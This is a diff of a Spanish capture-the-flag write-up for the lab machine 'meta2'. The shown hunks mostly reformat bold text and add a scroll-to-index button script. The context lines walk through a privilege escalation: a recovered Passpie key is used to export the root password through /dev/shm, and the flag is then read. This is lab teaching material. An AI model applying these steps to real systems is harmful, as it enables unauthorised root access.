+Muy bien, tenemos la contraseña para **Passpie**. Pero ¿esto de qué nos sirve? Pues vamos a usar **Passpie** para cambiar o mostrar la contraseña del **Root**.
 
-Si regresamos a la máquina, veremos que donde encontramos la llave privada del **Passpie**, hay un directorio llamado **ssh**, entremos:
+Si regresamos a la máquina, veremos que donde encontramos la llave privada del **Passpie**, hay un directorio llamado **SSH**, entremos:
 ```bash
 jnelson@meta2:~/.passpie$ cd ssh
 jnelson@meta2:~/.passpie/ssh$ ls -la
@@ -1443,11 +1426,11 @@ password: '-----BEGIN PGP MESSAGE-----
   nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km
 ...
 ```
-Bien, vamos a copiar esta contraseña, quítale la separación por renglones y guárdala. Lo que vamos a hacer será exportar la contraseña de Root para poder verla, el problema es que no podemos crear un archivo en donde estamos ni en ningún otro directorio con permisos de Root, por lo que hay que buscar uno.
+Bien, vamos a copiar esta contraseña, quítale la separación por renglones y guárdala. Lo que vamos a hacer será exportar la contraseña de Root para poder verla, el problema es que no podemos crear un archivo en donde estamos ni en ningún otro directorio con permisos de **Root**, por lo que hay que buscar uno.
 
 En el que si podemos escribir es en **/dev/shm**, esto lo sé porque fui buscando en varios directorios desde la raíz, usando el comando **ls -ld**.
 
-Ahora entremos ahí y crearemos el archivo con la llave de Root del **Passpie**:
+Ahora entremos ahí y crearemos el archivo con la llave de **Root** del **Passpie**:
 ```bash
 jnelson@meta2:~/.passpie/ssh$ cd /dev/shm
 jnelson@meta2:/dev/shm$ ls -la
@@ -1512,10 +1495,7 @@ root@meta2:~# cat root.txt
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
 
 
@@ -1535,3 +1515,48 @@ root@meta2:~# cat root.txt
 
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
